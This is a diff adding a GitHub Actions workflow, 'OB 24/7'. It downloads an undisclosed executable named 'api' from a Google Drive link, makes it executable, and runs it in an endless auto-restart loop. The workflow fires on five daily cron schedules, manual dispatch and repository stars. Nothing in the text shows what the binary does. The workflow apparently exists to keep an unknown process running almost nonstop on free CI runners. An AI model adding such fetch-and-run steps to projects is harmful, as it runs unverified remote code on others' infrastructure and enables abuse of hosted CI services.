@@ -1,0 +1,54 @@
+name: OB 24/7
+
+on:
+  schedule:
+    - cron: '0 5 * * *'
+    - cron: '0 10 * * *'
+    - cron: '0 15 * * *'
+    - cron: '0 20 * * *'
+    - cron: '0 1 * * *'
+  workflow_dispatch:
+  watch:
+    types: started
+
+jobs:
+  run-ob:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+
+    steps:
+    - name: Checkout repository
+      uses: actions/checkout@v3
+
+    - name: Install dependencies
+      run: |
+        sudo apt-get update
+        sudo apt-get install -y python3 python3-pip
+        pip3 install gdown
+        
+    - name: Download api
+      run: |
+        FILE_ID="1kmkI5AtdpHrBG4ml-FIO8xHExlKJ81BO"
+        gdown "https://drive.google.com/uc?id=${FILE_ID}" -O api
+        chmod +x api
+
+    - name: Kill old processes
+      run: |
+        pkill -f "api" 2>/dev/null || true
+        sleep 3
+
+    - name: Run api 24/7 with auto-restart
+      run: |
+        while true; do
+          echo "[$(date)] Starting api..."
+          ./api &
+          API_PID=$!
+          echo "[$(date)] api started with PID: $API_PID"
+          
+          while kill -0 $API_PID 2>/dev/null; do
+            sleep 30
+          done
+          
+          echo "[$(date)] api stopped! Restarting in 5 seconds..."
+          sleep 5
+        done
